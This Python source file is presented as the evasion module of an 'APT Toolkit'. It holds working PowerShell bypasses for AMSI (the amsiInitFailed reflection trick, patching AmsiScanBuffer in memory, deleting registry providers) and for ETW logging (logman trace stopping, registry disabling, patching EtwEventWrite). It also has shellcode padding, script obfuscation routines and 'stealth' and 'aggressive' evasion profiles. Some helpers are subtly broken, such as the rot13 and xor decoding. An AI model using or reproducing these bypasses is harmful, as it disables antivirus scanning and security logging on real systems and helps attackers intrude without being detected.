#!/usr/bin/env python3
"""
Evasion Techniques Module for APT Toolkit

This module provides advanced evasion techniques for payload generation,
incorporating the latest research in anti-detection methods.
"""

import random
import string
import hashlib
import base64
import struct
from typing import List, Dict, Any

class EvasionTechniques:
    """Collection of advanced evasion techniques"""
    
    def __init__(self):
        self.techniques = {
            "code_obfuscation": [
                "variable_renaming",
                "string_encoding",
                "control_flow_flattening",
                "dead_code_insertion",
                "instruction_substitution"
            ],
            "memory_evasion": [
                "process_hollowing",
                "reflective_dll_injection",
                "atom_bombing",
                "process_doppelganging",
                "module_stomping"
            ],
            "amsi_evasion": [
                "memory_patching",
                "reflection_bypass",
                "registry_modification",
                "process_suspension",
                "hook_bypass"
            ],
            "etw_evasion": [
                "provider_disabling",
                "event_filtering",
                "process_tampering",
                "registry_tampering",
                "kernel_patching"
            ],
            "signature_evasion": [
                "polymorphic_code",
                "metamorphic_code",
                "encrypted_payloads",
                "environmental_keying",
                "time_based_execution"
            ]
        }
    
    def generate_random_name(self, length: int = 8) -> str:
        """Generate random variable/function name"""
        return ''.join(random.choices(string.ascii_lowercase, k=length))
    
    def encode_string(self, text: str, method: str = "base64") -> str:
        """Encode string using various methods"""
        if method == "base64":
            return base64.b64encode(text.encode()).decode()
        elif method == "hex":
            return text.encode().hex()
        elif method == "rot13":
            return text.encode('rot13')
        elif method == "xor":
            key = random.randint(1, 255)
            return ''.join([chr(ord(c) ^ key) for c in text])
        elif method == "reverse":
            return text[::-1]
        else:
            return text
    
    def decode_string(self, encoded_text: str, method: str = "base64") -> str:
        """Decode string using various methods"""
        if method == "base64":
            return base64.b64decode(encoded_text.encode()).decode()
        elif method == "hex":
            return bytes.fromhex(encoded_text).decode()
        elif method == "rot13":
            return encoded_text.encode('rot13')
        elif method == "xor":
            # XOR is symmetric, same operation for encode/decode
            key = random.randint(1, 255)
            return ''.join([chr(ord(c) ^ key) for c in encoded_text])
        elif method == "reverse":
            return encoded_text[::-1]
        else:
            return encoded_text
    
    def generate_amsi_bypass(self, technique: str = "reflection") -> str:
        """Generate AMSI bypass code"""
        bypasses = {
            "reflection": """
# AMSI Bypass via Reflection
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
""",
            "memory": """
# AMSI Bypass via Memory Patching
$Win32 = Add-Type -MemberDefinition @"
[DllImport("kernel32")]
public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
[DllImport("kernel32")]
public static extern IntPtr LoadLibrary(string name);
[DllImport("kernel32")]
public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
"@ -Name "Win32" -Namespace Win32Functions -PassThru

$LoadLibrary = [Win32Functions.Win32]::LoadLibrary("amsi.dll")
$Address = [Win32Functions.Win32]::GetProcAddress($LoadLibrary, "AmsiScanBuffer")
$p = 0
[Win32Functions.Win32]::VirtualProtect($Address, [UIntPtr]5, 0x40, [Ref]$p)
$Patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
[System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, 6)
""",
            "registry": """
# AMSI Bypass via Registry
Remove-ItemProperty -Path "HKLM:\\SOFTWARE\\Microsoft\\AMSI" -Name "Providers" -ErrorAction SilentlyContinue
Set-ItemProperty -Path "HKLM:\\SOFTWARE\\Microsoft\\AMSI" -Name "Providers" -Value 0 -ErrorAction SilentlyContinue
"""
        }
        return bypasses.get(technique, bypasses["reflection"])
    
    def generate_etw_bypass(self, technique: str = "provider") -> str:
        """Generate ETW bypass code"""
        bypasses = {
            "provider": """
# ETW Bypass via Provider Disabling
logman stop "Microsoft-Windows-PowerShell" -ets
logman update trace "Microsoft-Windows-PowerShell" -p "Microsoft-Windows-PowerShell" 0 -ets
""",
            "registry": """
# ETW Bypass via Registry
Set-ItemProperty -Path "HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Winevt\\Channels\\Microsoft-Windows-PowerShell/Operational" -Name "Enabled" -Value 0
""",
            "memory": """
# ETW Bypass via Memory Patching
$Kernel32 = Add-Type -MemberDefinition @"
[DllImport("kernel32.dll")]
public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
[DllImport("kernel32.dll")]
public static extern IntPtr GetModuleHandle(string lpModuleName);
[DllImport("kernel32.dll")]
public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
"@ -Name "Kernel32" -Namespace Win32Functions -PassThru

$Ntdll = [Win32Functions.Kernel32]::GetModuleHandle("ntdll.dll")
$EtwEventWrite = [Win32Functions.Kernel32]::GetProcAddress($Ntdll, "EtwEventWrite")
$OldProtection = 0
[Win32Functions.Kernel32]::VirtualProtect($EtwEventWrite, [UIntPtr]5, 0x40, [Ref]$OldProtection)
$Patch = [Byte[]] (0xC3)
[System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $EtwEventWrite, 1)
"""
        }
        return bypasses.get(technique, bypasses["provider"])
    
    def generate_polymorphic_shellcode(self, original_shellcode: bytes) -> bytes:
        """Generate polymorphic shellcode"""
        # Simple polymorphic technique - add NOP sled and random bytes
        nop_sled = b"\x90" * random.randint(10, 50)  # NOP sled
        random_prefix = bytes([random.randint(0, 255) for _ in range(random.randint(5, 20))])
        random_suffix = bytes([random.randint(0, 255) for _ in range(random.randint(5, 20))])
        
        polymorphic_shellcode = nop_sled + random_prefix + original_shellcode + random_suffix
        
        return polymorphic_shellcode
    
    def generate_environmental_key(self, system_info: Dict[str, Any]) -> str:
        """Generate environmental key for execution"""
        key_components = [
            system_info.get('hostname', ''),
            system_info.get('username', ''),
            system_info.get('domain', ''),
            system_info.get('os_version', '')
        ]
        
        key_string = ''.join(key_components)
        return hashlib.sha256(key_string.encode()).hexdigest()
    
    def obfuscate_powershell_code(self, code: str, techniques: List[str]) -> str:
        """Obfuscate PowerShell code using multiple techniques"""
        obfuscated_code = code
        
        for technique in techniques:
            if technique == "variable_renaming":
                obfuscated_code = self._rename_variables(obfuscated_code)
            elif technique == "string_encoding":
                obfuscated_code = self._encode_strings(obfuscated_code)
            elif technique == "dead_code_insertion":
                obfuscated_code = self._insert_dead_code(obfuscated_code)
            elif technique == "control_flow_flattening":
                obfuscated_code = self._flatten_control_flow(obfuscated_code)
        
        return obfuscated_code
    
    def _rename_variables(self, code: str) -> str:
        """Rename variables in PowerShell code"""
        # Simple variable renaming - in practice would use AST parsing
        var_mapping = {
            "result": self.generate_random_name(),
            "data": self.generate_random_name(),
            "temp": self.generate_random_name(),
            "output": self.generate_random_name(),
            "process": self.generate_random_name()
        }
        
        for old_var, new_var in var_mapping.items():
            code = code.replace(f"${old_var}", f"${new_var}")
        
        return code
    
    def _encode_strings(self, code: str) -> str:
        """Encode strings in PowerShell code"""
        # Simple string encoding - would need proper parsing in production
        methods = ["base64", "hex", "rot13"]
        
        # Find and encode simple string literals
        lines = code.split('\n')
        for i, line in enumerate(lines):
            if '"' in line and '=' in line:
                parts = line.split('=')
                if len(parts) > 1 and '"' in parts[1]:
                    string_content = parts[1].split('"')[1]
                    if len(string_content) > 3:
                        method = random.choice(methods)
                        encoded = self.encode_string(string_content, method)
                        if method == "base64":
                            decoded_line = f"[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('{encoded}'))"
                        elif method == "hex":
                            decoded_line = f"-join('{encoded}' -split '(..)' | ? {{ $_ }} | % {{ [char][convert]::ToInt32($_, 16) }})"
                        else:
                            decoded_line = f"'{encoded}'.ToCharArray() | % {{ [char](([int]$_) - 13) }} | Join-String"
                        
                        lines[i] = line.replace(f'"{string_content}"', decoded_line)
        
        return '\n'.join(lines)
    
    def _insert_dead_code(self, code: str) -> str:
        """Insert dead code into PowerShell script"""
        dead_code_snippets = [
            "$deadVar1 = \"useless_string\"",
            "if ($false) { Write-Host \"This never executes\" }",
            "for ($i = 0; $i -lt 0; $i++) { $null = $i }",
            "$deadVar2 = Get-Random -Maximum 100",
            "try { throw \"fake_exception\" } catch { }"
        ]
        
        lines = code.split('\n')
        insert_positions = random.sample(range(len(lines)), min(3, len(lines) // 3))
        
        for pos in sorted(insert_positions, reverse=True):
            dead_code = random.choice(dead_code_snippets)
            lines.insert(pos, f"# {self.generate_random_name(10)}")
            lines.insert(pos + 1, dead_code)
        
        return '\n'.join(lines)
    
    def _flatten_control_flow(self, code: str) -> str:
        """Flatten control flow (simplified version)"""
        # This is a simplified version - real control flow flattening is complex
        lines = code.split('\n')
        
        # Add some random goto-like constructs (PowerShell doesn't have goto)
        if random.random() < 0.3:
            switch_var = self.generate_random_name()
            lines.insert(0, f"${switch_var} = {random.randint(1, 10)}")
            
            # Add a switch statement that does nothing
            switch_code = f"""
switch (${switch_var}) {{
    {{$_ -eq 1}} {{ break }}
    {{$_ -eq 2}} {{ break }}
    {{$_ -eq 3}} {{ break }}
    default {{ break }}
}}
"""
            lines.append(switch_code)
        
        return '\n'.join(lines)
    
    def get_evasion_profile(self, profile_name: str) -> Dict[str, Any]:
        """Get predefined evasion profiles"""
        profiles = {
            "stealth": {
                "description": "Maximum stealth with multiple evasion layers",
                "techniques": [
                    "polymorphic_code", "amsi_bypass", "etw_bypass",
                    "string_encoding", "variable_renaming", "environmental_keying"
                ],
                "amsi_method": "memory",
                "etw_method": "memory"
            },
            "balanced": {
                "description": "Balanced evasion with good detection avoidance",
                "techniques": [
                    "amsi_bypass", "etw_bypass", "string_encoding", "variable_renaming"
                ],
                "amsi_method": "reflection",
                "etw_method": "provider"
            },
            "aggressive": {
                "description": "Aggressive evasion for high-security environments",
                "techniques": [
                    "polymorphic_code", "metamorphic_code", "amsi_bypass", "etw_bypass",
                    "process_hollowing", "environmental_keying", "time_based_execution"
                ],
                "amsi_method": "memory",
                "etw_method": "memory"
            }
        }
        
        return profiles.get(profile_name, profiles["balanced"])

# Example usage
def main():
    evasion = EvasionTechniques()
    
    # Test string encoding
    test_string = "Hello World"
    encoded = evasion.encode_string(test_string, "base64")
    print(f"Original: {test_string}")
    print(f"Encoded: {encoded}")
    
    # Test AMSI bypass generation
    amsi_bypass = evasion.generate_amsi_bypass("reflection")
    print(f"\nAMSI Bypass:\n{amsi_bypass}")
    
    # Test evasion profile
    profile = evasion.get_evasion_profile("stealth")
    print(f"\nStealth Profile: {profile['description']}")
    print(f"Techniques: {', '.join(profile['techniques'])}")

if __name__ == "__main__":
    main()